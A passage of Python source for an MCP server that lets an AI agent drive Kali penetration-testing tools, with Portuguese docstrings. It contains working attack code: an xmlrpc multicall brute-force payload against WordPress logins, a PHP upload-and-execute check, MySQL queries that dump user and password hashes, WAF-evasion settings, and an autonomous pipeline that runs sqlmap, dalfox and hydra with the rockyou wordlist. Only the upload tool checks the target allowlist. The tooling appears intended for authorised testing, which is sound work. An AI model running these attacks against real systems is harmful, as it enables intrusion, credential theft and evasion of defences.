        evasion:      True = 5 threads + rate-limit 10 req/s + delay 200ms + User-Agent real.
                      Use quando o alvo tiver WAF ou rate limiting.
    """
    if param_name:
        if method.upper() == "POST":
            fuzz_url  = target_url
            post_data = f"{param_name}=FUZZ"
        else:
            sep      = "&" if "?" in target_url else "?"
            fuzz_url = f"{target_url}{sep}{param_name}=FUZZ"
            post_data = ""
    else:
        fuzz_url  = target_url if "FUZZ" in target_url else f"{target_url}/FUZZ"
        post_data = ""

    cmd = [
        "ffuf",
        "-u", fuzz_url,
        "-w", wordlist,
        "-mc", match_codes,
        "-timeout", "10",
        "-noninteractive",
        "-s",
    ]
    if evasion:
        cmd += ["-t", "5", "-rate", "10", "-p", "0.2", "-H", f"User-Agent: {_STEALTH_UA}"]
    elif filter_size == "" and not param_name:
        cmd += ["-t", "20"]
    else:
        cmd += ["-t", "20"]

    if method.upper() == "POST":
        cmd += ["-X", "POST", "-d", post_data]
    if filter_size:
        cmd += ["-fs", filter_size]

    return _exec_in_kali(cmd, tool_name="ffuf", target=target_url).model_dump()


@mcp.tool()
def scan_xmlrpc_wordpress(target_url: str) -> dict[str, Any]:
    """
    Testa o endpoint xmlrpc.php do WordPress para vetores de ataque.
    Use quando WPScan ou Nikto reportar xmlrpc.php acessível.

    Testa:
      - Existência e acessibilidade do xmlrpc.php
      - Enumeração de métodos via system.listMethods
      - Brute force via system.multicall — bypassa rate limiting (mil logins por request)
      - Confirmação de credenciais via wp.getUsersBlogs

    Args:
        target_url: URL base do WordPress. Ex: "http://192.168.1.10:8080"
    """
    xmlrpc_url = target_url.rstrip("/") + "/xmlrpc.php"
    results: dict[str, Any] = {"target": target_url, "xmlrpc_url": xmlrpc_url, "phases": {}}

    # 1. Verificar existência
    check = _exec_in_kali(
        ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", xmlrpc_url],
        tool_name="curl", target=target_url,
    )
    http_code = check.output.strip()
    results["phases"]["existence"] = {"http_code": http_code, "accessible": http_code in ("200", "405")}

    if http_code not in ("200", "405"):
        results["accessible"] = False
        results["summary"]    = f"xmlrpc.php não acessível (HTTP {http_code})."
        return results

    results["accessible"] = True

    # 2. Enumerar métodos disponíveis
    list_methods_xml = (
        "<?xml version='1.0'?>"
        "<methodCall><methodName>system.listMethods</methodName><params/></methodCall>"
    )
    methods = _exec_in_kali(
        ["curl", "-s", "-X", "POST", "-H", "Content-Type: text/xml", "-d", list_methods_xml, xmlrpc_url],
        tool_name="curl", target=target_url,
    )
    results["phases"]["list_methods"] = {"output": methods.output[:3000]}

    # 3. Multicall brute force com credenciais comuns (3 tentativas)
    multicall_xml = (
        "<?xml version='1.0'?><methodCall><methodName>system.multicall</methodName>"
        "<params><param><value><array><data>"
        "<value><struct>"
        "<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>"
        "<member><name>params</name><value><array><data>"
        "<value><string>admin</string></value><value><string>admin</string></value>"
        "</data></array></value></member></struct></value>"
        "<value><struct>"
        "<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>"
        "<member><name>params</name><value><array><data>"
        "<value><string>admin</string></value><value><string>password123</string></value>"
        "</data></array></value></member></struct></value>"
        "<value><struct>"
        "<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>"
        "<member><name>params</name><value><array><data>"
        "<value><string>admin</string></value><value><string>123456</string></value>"
        "</data></array></value></member></struct></value>"
        "</data></array></value></param></params></methodCall>"
    )
    multicall = _exec_in_kali(
        ["curl", "-s", "-X", "POST", "-H", "Content-Type: text/xml", "-d", multicall_xml, xmlrpc_url],
        tool_name="curl", target=target_url,
    )
    results["phases"]["multicall"] = {"output": multicall.output[:3000]}

    auth_ok = any(k in multicall.output for k in ("isAdmin", "blogName", "blogid"))
    results["auth_bypass_found"] = auth_ok
    results["summary"] = (
        "CRÍTICO: Credenciais válidas confirmadas via xmlrpc multicall!" if auth_ok
        else "xmlrpc.php exposto. Métodos enumerados. Nenhuma das 3 credenciais de teste confirmou login."
    )
    return results


@mcp.tool()
def testar_upload_arquivo(
    upload_url: str,
    field_name: str = "file",
    upload_path_hint: str = "/wp-content/uploads/",
) -> dict[str, Any]:
    """
    Verifica vulnerabilidade de upload irrestrito de arquivos (CWE-434).
    Envia um arquivo PHP de prova-de-conceito inócuo e verifica se é executável.

    ATENÇÃO: Cria um arquivo PHP sem comandos destrutivos no servidor de teste.
    Use somente em ambientes autorizados.

    Args:
        upload_url:       URL do endpoint de upload.
                          Ex: "http://192.168.1.10/wp-content/plugins/vuln-plugin/upload.php"
        field_name:       Nome do campo <input type="file"> no formulário. Padrão: "file"
        upload_path_hint: Caminho base onde o servidor salva uploads.
                          Ex: "/wp-content/uploads/", "/uploads/", "/files/"
    """
    if not _is_allowed(upload_url):
        return {
            "success": False,
            "error": f"Alvo '{upload_url}' não está na allowlist. Use gerenciar_allowlist() primeiro.",
        }

    test_id  = uuid.uuid4().hex[:8]
    filename = f"test_{test_id}.php"

    try:
        container = _get_container()
        container.exec_run([
            "sh", "-c",
            f"printf '%s' '<?php echo \"UPLOAD_CONFIRMED_{test_id}_\".phpversion(); ?>' > /tmp/{filename}",
        ])
    except RuntimeError as exc:
        return {"success": False, "error": str(exc)}

    results: dict[str, Any] = {
        "upload_url": upload_url,
        "test_file":  filename,
        "test_id":    test_id,
        "phases":     {},
    }

    # Upload do arquivo PHP de teste
    upload_result = _exec_in_kali(
        ["curl", "-s", "-i", "-F", f"{field_name}=@/tmp/{filename}", upload_url],
        tool_name="curl", target=upload_url,
    )
    results["phases"]["upload"] = upload_result.model_dump()

    # Tentar extrair URL do arquivo da response; senão, construir URL provável
    base_url     = "/".join(upload_url.split("/")[:3])
    uploaded_url = None
    for token in upload_result.output.split():
        tok = token.strip('"\'<>\n\r')
        if filename in tok or test_id in tok:
            uploaded_url = tok
            break
    if not uploaded_url:
        uploaded_url = base_url + upload_path_hint + filename

    results["likely_url"] = uploaded_url

    # Verificar se o arquivo é acessível e se PHP executou
    access_result = _exec_in_kali(
        ["curl", "-s", "-L", "--max-time", "10", uploaded_url],
        tool_name="curl", target=uploaded_url,
    )
    results["phases"]["access"] = access_result.model_dump()

    marker     = f"UPLOAD_CONFIRMED_{test_id}_"
    executed   = marker in access_result.output
    accessible = access_result.exit_code == 0 and bool(access_result.output.strip())

    results["file_accessible"] = accessible
    results["php_executed"]    = executed

    if executed:
        php_ver = access_result.output.split(marker)[-1].strip()
        results["php_version"] = php_ver
        results["severity"]    = "critical"
        results["summary"]     = (
            f"CRÍTICO: Upload e execução de PHP confirmados! "
            f"PHP {php_ver} executando no servidor. RCE possível via webshell."
        )
    elif accessible:
        results["severity"] = "high"
        results["summary"]  = (
            f"ALTO: Arquivo uploaded e acessível em {uploaded_url} "
            "mas PHP não executou (pode estar bloqueado no diretório de uploads)."
        )
    else:
        results["severity"] = "medium"
        results["summary"]  = (
            "Upload enviado mas arquivo não acessível no caminho esperado. "
            f"Verifique a response do upload e ajuste upload_path_hint. Tentativa: {uploaded_url}"
        )
    return results


@mcp.tool()
def enumerar_banco_mysql(
    host: str,
    port: int = 3306,
    user: str = "root",
    password: str = "root",
    database: str = "",
) -> dict[str, Any]:
    """
    Conecta diretamente ao MySQL e enumera bancos, tabelas, usuários e hashes de senha.
    Use quando Nmap identificar porta 3306 exposta com credenciais fracas.

    Para WordPress: passe database="wordpress" para extrair hashes da tabela wp_users
    e quebrá-los offline com hashcat (formato phpass).

    ATENÇÃO: acesso direto ao banco — use somente em ambientes autorizados.

    Args:
        host:     IP ou hostname do MySQL. Ex: "192.168.1.10", "vulnwp-db"
        port:     Porta MySQL. Padrão: 3306
        user:     Usuário. Ex: "root", "wordpress"
        password: Senha. Ex: "root", "wordpress"
        database: Banco específico para listar tabelas. Ex: "wordpress"
    """
    if database and not re.match(r"^[a-zA-Z0-9_\-]+$", database):
        return {"success": False, "error": "database contém caracteres inválidos."}

    mysql_base = [
        "mysql",
        "-h", host,
        "-P", str(port),
        "-u", user,
        f"-p{password}",
        "--connect-timeout", "10",
        "-e",
    ]

    results: dict[str, Any] = {
        "host": host, "port": port, "user": user,
        "phases": {}, "connected": False,
    }

    # 1. Listar bancos de dados
    db_result = _exec_in_kali(
        mysql_base + ["SHOW DATABASES;"],
        tool_name="mysql", target=host,
    )
    results["phases"]["databases"]  = db_result.model_dump()
    results["connected"]            = db_result.success

    if not db_result.success:
        results["summary"] = f"Falha de conexão: {db_result.error or db_result.output}"
        return results

    # 2. Usuários e hashes de senha
    users_result = _exec_in_kali(
        mysql_base + ["SELECT user, host, authentication_string FROM mysql.user;"],
        tool_name="mysql", target=host,
    )
    results["phases"]["users_hashes"] = users_result.model_dump()

    # 3. Tabelas do banco especificado
    if database:
        tables_result = _exec_in_kali(
            mysql_base + [f"USE `{database}`; SHOW TABLES;"],
            tool_name="mysql", target=host,
        )
        results["phases"]["tables"] = tables_result.model_dump()

        # 4. wp_users se for WordPress
        if "wp_users" in tables_result.output:
            wp_users = _exec_in_kali(
                mysql_base + [
                    f"USE `{database}`; "
                    "SELECT user_login, user_pass, user_email, user_registered FROM wp_users LIMIT 20;"
                ],
                tool_name="mysql", target=host,
            )
            results["phases"]["wp_users"]           = wp_users.model_dump()
            results["wordpress_hashes_found"]        = "user_pass" in wp_users.output

    results["summary"] = (
        f"Conexão bem-sucedida como {user}@{host}:{port}. "
        "Veja 'phases' para bancos de dados, usuários e hashes."
    )
    return results


@mcp.tool()
def retomar_sessao(target: str) -> dict[str, Any]:
    """
    Lista todos os scans salvos em disco para um alvo, permitindo retomar um pentest
    interrompido sem perder o progresso anterior.

    Outputs são salvos automaticamente em ~/mcps/outputs/kali-mcp/<alvo>/ a cada scan.

    Args:
        target: Domínio ou IP do alvo. Ex: "exemplo.com.br", "192.168.1.10"
    """
    out_dir = _target_output_dir(target)
    session_path = out_dir / "session.json"

    if not session_path.exists():
        files = sorted(out_dir.glob("*.txt"))
        if not files:
            return {"success": False, "error": f"Nenhum output encontrado para '{target}' em {out_dir}"}
        return {
            "success":   True,
            "output_dir": str(out_dir),
            "files":     [f.name for f in files],
            "session":   None,
        }

    session = json.loads(session_path.read_text(encoding="utf-8"))
    scans   = session.get("scans", [])
    tools_done = [s["tool"] for s in scans]

    # Ler previews dos últimos outputs por ferramenta
    previews: dict[str, str] = {}
    for scan in reversed(scans):
        tool = scan["tool"]
        if tool not in previews:
            fpath = out_dir / scan["file"]
            if fpath.exists():
                content = fpath.read_text(encoding="utf-8", errors="replace")
                previews[tool] = content[:1500]

    return {
        "success":     True,
        "output_dir":  str(out_dir),
        "target":      session.get("target"),
        "started":     session.get("started"),
        "last_updated": session.get("last_updated"),
        "total_scans": len(scans),
        "tools_executados": sorted(set(tools_done)),
        "scans":       scans,
        "previews":    previews,
    }


@mcp.tool()
def listar_findings(target: str = "", limit: int = 50) -> dict[str, Any]:
    """
    Lista findings registrados no banco de dados, filtrados opcionalmente por alvo.

    Args:
        target: Filtro parcial por alvo. Vazio = todos.
        limit:  Máximo de resultados. Padrão: 50
    """
    with sqlite3.connect(DB_PATH) as conn:
        if target:
            rows = conn.execute(
                "SELECT id, tool, target, timestamp, exit_code, success, error "
                "FROM findings WHERE target LIKE ? ORDER BY timestamp DESC LIMIT ?",
                (f"%{target}%", limit),
            ).fetchall()
        else:
            rows = conn.execute(
                "SELECT id, tool, target, timestamp, exit_code, success, error "
                "FROM findings ORDER BY timestamp DESC LIMIT ?",
                (limit,),
            ).fetchall()

    return {
        "total": len(rows),
        "findings": [
            {
                "id": r[0], "tool": r[1], "target": r[2], "timestamp": r[3],
                "exit_code": r[4], "success": bool(r[5]), "error": r[6],
            }
            for r in rows
        ],
    }


@mcp.tool()
def gerar_relatorio(target: str, formato: str = "markdown") -> dict[str, Any]:
    """
    Gera relatório consolidado de todos os findings de um alvo.
    Arquivo salvo em ~/.kali-mcp/workspaces/<alvo>_<timestamp>.<ext>

    Args:
        target:  Alvo a consolidar. Ex: "192.168.1.10", "app.local"
        formato: "markdown" (padrão) ou "json"
    """
    with sqlite3.connect(DB_PATH) as conn:
        rows = conn.execute(
            "SELECT tool, target, timestamp, exit_code, success, output, error "
            "FROM findings WHERE target LIKE ? ORDER BY timestamp ASC",
            (f"%{target}%",),
        ).fetchall()

    if not rows:
        return {"success": False, "error": f"Nenhum finding encontrado para '{target}'"}

    findings = [
        {
            "tool": r[0], "target": r[1], "timestamp": r[2],
            "exit_code": r[3], "success": bool(r[4]), "output": r[5], "error": r[6],
        }
        for r in rows
    ]

    now         = datetime.now()
    ts          = now.strftime("%Y%m%d_%H%M%S")
    safe_target = target.replace("/", "_").replace(":", "_").replace(".", "_")
    tools_used  = sorted({f["tool"] for f in findings})

    if formato == "json":
        content = json.dumps(
            {"target": target, "generated": now.isoformat(), "findings": findings},
            indent=2, ensure_ascii=False,
        )
        ext = "json"
    else:
        total   = len(findings)
        success = sum(1 for f in findings if f["success"])
        lines   = [
            f"# Relatório de Segurança — {target} — {now.strftime('%Y-%m-%d %H:%M')}",
            "",
            "## Escopo Testado",
            f"- **Alvo:** `{target}`",
            f"- **Ferramentas executadas:** {', '.join(tools_used)}",
            f"- **Total de scans:** {total}  |  **Bem-sucedidos:** {success}  |  **Com erro:** {total - success}",
            f"- **Gerado em:** {now.isoformat()}",
            "",
            "---",
            "",
            "## Findings por Ferramenta",
            "",
        ]
        for f in findings:
            status = "OK" if f["success"] else "FALHOU"
            lines += [
                f"### [{status}] {f['tool'].upper()} — {f['timestamp']}",
                f"**Alvo:** `{f['target']}`  |  **Exit code:** `{f['exit_code']}`",
                "",
            ]
            if f["error"]:
                lines += [f"> **Erro:** {f['error']}", ""]
            if f["output"]:
                preview = f["output"][:5000]
                truncated = " *(truncado — veja o arquivo completo)*" if len(f["output"]) > 5000 else ""
                lines += [f"```\n{preview}\n```{truncated}", ""]
            lines += ["---", ""]

        lines += [
            "## Sumário de Execuções",
            "| Ferramenta | Status | Timestamp |",
            "|---|---|---|",
        ]
        for f in findings:
            lines.append(f"| {f['tool']} | {'✓' if f['success'] else '✗'} | {f['timestamp']} |")

        content = "\n".join(lines)
        ext = "md"

    output_path = WORKSPACE_DIR / f"{safe_target}_{ts}.{ext}"
    output_path.write_text(content, encoding="utf-8")

    return {
        "success":        True,
        "target":         target,
        "findings_count": len(findings),
        "output_file":    str(output_path),
        "formato":        formato,
        "preview":        content[:3000],
    }


@mcp.tool()
def pentest_completo(
    target: str,
    target_url: str = "",
    include_brute_force: bool = False,
    evasion: bool = False,
) -> dict[str, Any]:
    """
    Executa o pipeline completo de pentest de forma autônoma na ordem correta.

    Pipeline executado:
      1.  Ping                      — verifica se o alvo está online
      2.  Nmap                      — reconhecimento de portas e serviços
      3.  Subfinder                 — enumeração de subdomínios (se for domínio)
      4.  Gobuster                  — enumeração de diretórios/arquivos ocultos
      5.  Arquivos sensíveis        — verifica .env, backups, phpinfo etc.
      6.  Nikto                     — análise de vulnerabilidades web
      7.  Headers de segurança      — CSP, X-Frame-Options, HSTS, cookies
      8.  Nuclei                    — detecção de CVEs (+ tags wordpress se detectado)
      9.  WPScan                    — auditoria WordPress profunda (se detectado)
      10. xmlrpc.php                — brute force e enumeração xmlrpc (se WordPress)
      11. Testssl                   — análise SSL/TLS (somente se HTTPS)
      12. Katana                    — crawling com XHR e descoberta de parâmetros
      13. Dalfox                    — XSS nos parâmetros descobertos
      14. SQLMap                    — SQL Injection nos parâmetros descobertos
      15. Hydra                     — brute force SSH/FTP (somente se include_brute_force=True)
      16. Relatório                 — consolidação automática em Markdown

    ATENÇÃO: pode levar 25-60 minutos dependendo do alvo e da superfície exposta.

    Args:
        target:               IP ou hostname do alvo. Ex: "192.168.1.10", "app.local"
        target_url:           URL base (inferida do Nmap se omitida).
        include_brute_force:  Incluir Hydra no pipeline. Requer autorização explícita.
        evasion:              True = scans lentos com UA real para evitar WAF/rate-limit.
                              Recomendado para alvos externos (produção, hospedagem compartilhada).
    """
    results: dict[str, Any] = {
        "target":    target,
        "started":   datetime.now().isoformat(),
        "evasion":   evasion,
        "phases":    {},
        "warnings":  [],
    }

    # ── Parâmetros de evasão usados nos comandos inline ──
    _gb_threads  = ["5"] if evasion else ["20"]
    _gb_delay    = ["--delay", "300ms"] if evasion else []
    _gb_ua       = ["-a", _STEALTH_UA] if evasion else []
    _nmap_delay  = ["--scan-delay", "1s", "-T2"] if evasion else []
    _nuclei_rate = "10" if evasion else "20"
    _katana_rate = ["-rate-limit", "5"] if evasion else []

    # ── 1. Ping ──
    ping = _exec_in_kali(["ping", "-c", "3", "-W", "2", target], "ping", target)
    results["phases"]["ping"] = ping.model_dump()
    if not ping.success:
        results["warnings"].append("Alvo não respondeu ao ping — pode estar offline ou bloquear ICMP. Continuando assim mesmo.")

    # ── 2. Nmap ──
    nmap = _exec_in_kali(
        ["nmap", "-sV", "-F", "--open"] + _nmap_delay + [target],
        "nmap", target,
    )
    results["phases"]["nmap"] = nmap.model_dump()

    # Detectar portas web, SSH e FTP no output
    web_ports: list[int] = []
    has_ssh = has_ftp = False
    for line in nmap.output.splitlines():
        low = line.lower()
        if "open" not in low:
            continue
        for p in [80, 443, 8080, 8443, 3000, 4000, 5000, 8000, 9090, 8888]:
            if f"{p}/tcp" in line:
                web_ports.append(p)
        if "22/tcp" in line:
            has_ssh = True
        if "21/tcp" in line:
            has_ftp = True

    # Inferir URL base se não fornecida
    if not target_url and web_ports:
        proto = "https" if (443 in web_ports or 8443 in web_ports) else "http"
        port  = web_ports[0]
        target_url = (
            f"{proto}://{target}" if port in (80, 443)
            else f"{proto}://{target}:{port}"
        )

    results["web_ports_found"]  = web_ports
    results["target_url_used"]  = target_url
    results["has_ssh"]          = has_ssh
    results["has_ftp"]          = has_ftp

    # ── 3. Subfinder (somente domínios) ──
    if not target.replace(".", "").isdigit():
        sub = _exec_in_kali(["subfinder", "-d", target, "-silent"], "subfinder", target)
        results["phases"]["subfinder"] = sub.model_dump()

    # ── Fases web (somente se URL disponível) ──
    if target_url:
        is_https = target_url.startswith("https")

        # ── 4. Gobuster ──
        gobuster = _exec_in_kali(
            [
                "gobuster", "dir",
                "-u", target_url,
                "-w", "/usr/share/wordlists/dirb/common.txt",
                "-x", "php,html,js,txt,bak,env",
                "-t", *_gb_threads, *_gb_delay, *_gb_ua,
                "-q", "--no-error", "--timeout", "15s",
            ],
            "gobuster", target_url,
        )
        results["phases"]["gobuster"] = gobuster.model_dump()

        # Detectar WordPress pelo output do Gobuster + Nmap
        is_wordpress = any(
            kw in gobuster.output.lower() or kw in nmap.output.lower()
            for kw in ("wp-login", "wp-content", "wp-admin", "wordpress")
        )
        results["is_wordpress"] = is_wordpress

        # ── 5. Arquivos sensíveis expostos ──
        exposed = _exec_in_kali(
            [
                "gobuster", "dir",
                "-u", target_url,
                "-w", "/usr/share/wordlists/sensitive-paths.txt",
                "-t", *(["3"] if evasion else ["10"]),
                *_gb_delay, *_gb_ua,
                "-q", "--no-error", "--timeout", "15s",
            ],
            "gobuster", target_url,
        )
        results["phases"]["arquivos_expostos"] = exposed.model_dump()

        # ── 6. Nikto ──
        nikto = _exec_in_kali(
            ["nikto", "-h", target_url, "-nointeractive", "-maxtime", "120s"],
            "nikto", target_url,
        )
        results["phases"]["nikto"] = nikto.model_dump()

        # ── 7. Headers de segurança ──
        headers_cmd = ["curl", "-s", "-I", "-L", "--max-time", "10", target_url]
        headers_raw = _exec_in_kali(headers_cmd, "curl", target_url)
        _parsed_headers: dict[str, str] = {}
        for _line in headers_raw.output.splitlines():
            if ":" in _line and not _line.lower().startswith("http/"):
                _k, _, _v = _line.partition(":")
                _parsed_headers[_k.strip().lower()] = _v.strip()
        _EXPECTED = {
            "content-security-policy": "high", "x-frame-options": "medium",
            "x-content-type-options": "medium", "strict-transport-security": "high",
        }
        _header_findings = [
            {"header": h, "status": "present" if _parsed_headers.get(h) else "missing",
             "severity": "info" if _parsed_headers.get(h) else sev}
            for h, sev in _EXPECTED.items()
        ]
        results["phases"]["headers_seguranca"] = {
            "tool": "curl-headers", "target": target_url,
            "exit_code": headers_raw.exit_code, "success": headers_raw.success,
            "findings": _header_findings,
            "raw": headers_raw.output[:2000],
        }

        # ── 8. Nuclei (com tags wordpress se detectado) ──
        nuclei_cmd = [
            "nuclei", "-u", target_url,
            "-severity", "medium,high,critical",
            "-silent", "-no-color", "-timeout", "10",
            "-rate-limit", _nuclei_rate,
            "-H", f"User-Agent: {_STEALTH_UA}",
        ]
        if is_wordpress:
            nuclei_cmd += ["-tags", "wordpress"]
        nuclei = _exec_in_kali(nuclei_cmd, "nuclei", target_url)
        results["phases"]["nuclei"] = nuclei.model_dump()

        # ── 9. WPScan (somente se WordPress detectado) ──
        if is_wordpress:
            wpscan = _exec_in_kali(
                [
                    "wpscan",
                    "--url", target_url,
                    "--no-banner", "--no-update",
                    "--disable-tls-checks",
                    "--format", "cli-no-colour",
                    "--enumerate", "vp,vt,u",
                    "--plugins-detection", "passive",
                ],
                "wpscan", target_url,
            )
            results["phases"]["wpscan"] = wpscan.model_dump()

            # ── 10. xmlrpc (se WordPress) ──
            xmlrpc_url = target_url.rstrip("/") + "/xmlrpc.php"
            xmlrpc_check = _exec_in_kali(
                ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}", xmlrpc_url],
                "curl", target_url,
            )
            if xmlrpc_check.output.strip() in ("200", "405"):
                xmlrpc_result = scan_xmlrpc_wordpress(target_url)
                results["phases"]["xmlrpc"] = xmlrpc_result
            else:
                results["phases"]["xmlrpc"] = {"accessible": False, "http_code": xmlrpc_check.output.strip()}

        # ── 11. Testssl (somente HTTPS) ──
        if is_https:
            host_port = target_url.replace("https://", "")
            if ":" not in host_port:
                host_port = f"{host_port}:443"
            testssl = _exec_in_kali(
                ["testssl.sh", "--quiet", "--color", "0", "--fast", host_port],
                "testssl", target,
            )
            results["phases"]["testssl"] = testssl.model_dump()

        # ── 12. Katana (crawling com XHR) ──
        katana = _exec_in_kali(
            [
                "katana", "-u", target_url,
                "-d", "3", "-silent", "-jc", "-xhr",
                "-kf", "all", "-timeout", "30", "-retry", "2",
                *_katana_rate,
            ],
            "katana", target_url,
        )
        results["phases"]["katana"] = katana.model_dump()

        # Extrair URLs com parâmetros do output do Katana
        param_urls = [
            line.strip()
            for line in katana.output.splitlines()
            if "?" in line and "=" in line
        ]
        results["param_urls_found"] = param_urls

        # ── 13 + 14. Dalfox e SQLMap (nos parâmetros encontrados) ──
        if param_urls:
            test_url = param_urls[0]

            dalfox = _exec_in_kali(
                ["dalfox", "url", test_url, "--no-color", "--silence", "--timeout", "30", "--worker", "10"],
                "dalfox", test_url,
            )
            results["phases"]["dalfox"] = dalfox.model_dump()

            sqlmap = _exec_in_kali(
                [
                    "sqlmap", "-u", test_url,
                    "--batch", "--random-agent",
                    "--risk=1", "--level=1",
                    "--output-dir=/tmp/sqlmap-results",
                ],
                "sqlmap", test_url,
            )
            results["phases"]["sqlmap"] = sqlmap.model_dump()
        else:
            results["warnings"].append(
                "Katana não encontrou URLs com parâmetros — Dalfox e SQLMap pulados. "
                "Execute manualmente se identificar endpoints manuais."
            )

    else:
        results["warnings"].append(
            "Nenhuma porta web identificada pelo Nmap — fases web puladas. "
            "Se o alvo tiver web em porta não-padrão, passe target_url manualmente."
        )

    # ── 15. Hydra (opcional) ──
    if include_brute_force:
        if has_ssh:
            hydra_ssh = _exec_in_kali(
                [
                    "hydra",
                    "-L", "/usr/share/wordlists/unix_users.txt",
                    "-P", "/usr/share/wordlists/rockyou.txt",
                    "-s", "22", "-t", "4", "-f", "-q",
                    target, "ssh",
                ],
                "hydra", target,
            )
            results["phases"]["hydra_ssh"] = hydra_ssh.model_dump()

        if has_ftp:
            hydra_ftp = _exec_in_kali(
                [
                    "hydra",
                    "-L", "/usr/share/wordlists/unix_users.txt",
                    "-P", "/usr/share/wordlists/rockyou.txt",
                    "-s", "21", "-t", "4", "-f", "-q",
                    target, "ftp",
                ],
                "hydra", target,
            )
            results["phases"]["hydra_ftp"] = hydra_ftp.model_dump()

    # ── 16. Relatório ──
    report = gerar_relatorio(target, formato="markdown")
    results["report"]    = report
    results["finished"]  = datetime.now().isoformat()
    results["phases_run"] = list(results["phases"].keys())

    return results


# ── Entrypoint ────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    if os.environ.get("KALI_MCP_TRANSPORT", "stdio").lower() == "http":
        # Modo remoto: pensado para acesso via Tailscale. Nunca faça bind
        # em 0.0.0.0 aqui — isso exporia ferramentas ofensivas (hydra,
        # sqlmap, upload de PHP malicioso etc.) a qualquer rede local.
        host = os.environ.get("KALI_MCP_HOST", "127.0.0.1")
        port = int(os.environ.get("KALI_MCP_PORT", "8765"))
        logging.info(f"Kali MCP Bridge (HTTP) em http://{host}:{port}/mcp")
        mcp.run(transport="http", host=host, port=port)
    else:
        mcp.run()
